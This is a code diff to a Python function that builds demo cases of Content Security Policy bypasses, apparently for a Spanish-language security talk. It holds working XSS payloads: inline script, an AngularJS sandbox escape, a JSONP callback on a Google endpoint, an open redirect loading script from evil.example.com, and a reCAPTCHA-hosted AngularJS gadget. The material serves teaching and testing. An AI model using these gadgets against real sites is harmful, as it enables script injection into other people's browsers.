@@ -6,154 +6,178 @@ BASE_PATH = Path(__file__).parent
 
 
 def get_examples():
+    examples = []
     csp = "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;"
-    example_01 = {
-        "title": "CSP bypass usando inline JS",
-        "csp": csp,
-        "vulnerable": True,
-        "payload": dedent(
-            """
+    examples.append(
+        {
+            "title": "CSP bypass usando inline JS",
+            "csp": csp,
+            "vulnerable": True,
+            "payload": dedent(
+                """
             <script>
               alert(document.domain)
             </script>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
     csp = csp.replace("'unsafe-inline' ", "")
-    example_02 = {
-        **example_01,
-        "vulnerable": False,
-        "csp": csp,
-    }
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": False,
+            "csp": csp,
+        }
+    )
 
-    example_03 = {
-        "title": "CSP bypass usando AngularJS",
-        "csp": csp,
-        "vulnerable": True,
-        "payload": dedent(
-            """
+    examples.append(
+        {
+            "title": "CSP bypass usando AngularJS",
+            "csp": csp,
+            "vulnerable": True,
+            "payload": dedent(
+                """
             <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
 
             <div ng-app ng-csp>
               <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
             </div>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
     csp = csp.replace("'unsafe-eval' ", "").replace(
         "https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js",
         "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
     )
-    example_04 = {
-        **example_03,
-        "vulnerable": False,
-        "csp": csp,
-    }
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": False,
+            "csp": csp,
+        }
+    )
 
-    example_05 = {
-        "title": "CSP bypass usando JSONP",
-        "csp": csp,
-        "vulnerable": True,
-        "payload": dedent(
-            """
+    examples.append(
+        {
+            "title": "CSP bypass usando JSON-P",
+            "csp": csp,
+            "vulnerable": True,
+            "payload": dedent(
+                """
             <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
     csp = csp.replace("https://*.google.com", "https://www.google.com/recaptcha/")
     csp = csp.replace("https://*.gstatic.com", "https://www.gstatic.com/recaptcha/")
-    example_06 = {
-        **example_05,
-        "vulnerable": False,
-        "csp": csp,
-    }
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": False,
+            "csp": csp,
+        }
+    )
 
-    example_07 = {
-        "title": "CSP bypass usando un open redirect",
-        "csp": csp,
-        "vulnerable": True,
-        "payload": dedent(
+    examples.append(
+        {
+            "title": "CSP bypass usando un open redirect",
+            "csp": csp,
+            "vulnerable": False,
+            "payload": dedent(
+                """
+            <script src="/_/redirect/?https://evil.example.com/path/to/evil.js"></script>
             """
+            ).strip("\n"),
+        }
+    )
+
+    examples.append(
+        {
+            "title": "CSP bypass usando un open redirect",
+            "csp": csp,
+            "vulnerable": True,
+            "payload": dedent(
+                """
             <script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
     csp = csp.replace(
         "https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js",
         "https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js",
     )
 
-    example_08 = {
-        **example_07,
-        "vulnerable": False,
-        "csp": csp,
-    }
+    examples.append(
+        {
+            **examples[-1],
+            "vulnerable": False,
+            "csp": csp,
+        }
+    )
 
-    example_09 = {
-        "title": "CSP bypass, AngularJS está de vuelta!",
-        "csp": csp,
-        "vulnerable": True,
-        "payload": dedent(
-            """
+    examples.append(
+        {
+            "title": "CSP bypass, AngularJS está de vuelta!",
+            "csp": csp,
+            "vulnerable": True,
+            "payload": dedent(
+                """
             <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
 
             <div ng-app ng-csp>
               <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
             </div>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
     nonce = "8IBTHwOdqNKAWeKl7plt8g=="
     sha256 = "opnq3UrQLt34nD/Io3x4OQXex7rVCcRNO2/Dym9R8ro="
     csp = f"script-src 'nonce-{nonce}' 'sha256-{sha256}';"
 
-    example_10 = {
-        "title": "CSP usando un nonce y hash",
-        "csp": csp,
-        "vulnerable": False,
-        "nonce": nonce,
-        "payload": dedent(
-            f"""
+    examples.append(
+        {
+            "title": "CSP usando un nonce y hash",
+            "csp": csp,
+            "vulnerable": False,
+            "nonce": nonce,
+            "payload": dedent(
+                f"""
             <script nonce="{nonce}">
               alert("Este script si está permitido")
             </script>
 
             <script>alert("Inline script correspondiente al hash!")</script>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
-    example_11 = {
-        **example_10,
-        "payload": dedent(
-            f"""
+    examples.append(
+        {
+            **examples[-1],
+            "payload": dedent(
+                f"""
             <script nonce="abc1234">
               alert("Este script si está permitido")
             </script>
 
             <script>alert("Inline script correspondiente al hash!");</script>
             """
-        ).strip("\n"),
-    }
+            ).strip("\n"),
+        }
+    )
 
-    return [
-        example_01,
-        example_02,
-        example_03,
-        example_04,
-        example_05,
-        example_06,
-        example_07,
-        example_08,
-        example_09,
-        example_10,
-        example_11,
-    ]
+    return examples
 
 
 def get_template(name):
